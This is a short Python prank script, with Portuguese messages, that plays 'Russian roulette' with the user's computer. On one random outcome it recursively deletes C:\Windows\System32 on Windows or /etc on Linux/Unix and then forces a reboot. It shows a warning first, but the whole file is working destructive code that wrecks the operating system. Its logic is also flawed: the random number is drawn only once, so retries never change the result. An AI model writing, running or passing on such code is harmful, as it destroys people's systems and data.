import os
import shutil
import random
import time

roleta_russa = random.randint(1, 6)

print("ALERTA! Este é um programa que pode causar danos ao seu sistema operacional, tenha certeza antes de continuar. (NÃO ME RESPONSABILIZO)")
input("Caso tenha certeza, Aperte enter para continuar...")

name = os.name

while True:
    if roleta_russa == 5:

        if name == 'nt':
            print("GAME OVER!")
            shutil.rmtree("C:\Windows\System32")
            time.sleep(5)
            os.system("shutdown /r /t 1")

        elif name == 'posix':
            print("GAME OVER!")
            shutil.rmtree("/etc")
            time.sleep(5)
            os.system("sudo reboot")
    else:
        print(f"Blank! Você teve sorte hein o numero caiu em {roleta_russa}")
        escolha = input("Você deseja tentar novamente (y) ou sair do programa (n) ?")
        if escolha.lower() == "y":
            continue
        elif escolha.lower() == "n":
            break
        else:
            print("Escolha não reconhecida, Fechando o programa em 3 segundos...")
            time.sleep(3)
            exit(1)

# CODED BY: NOKEIC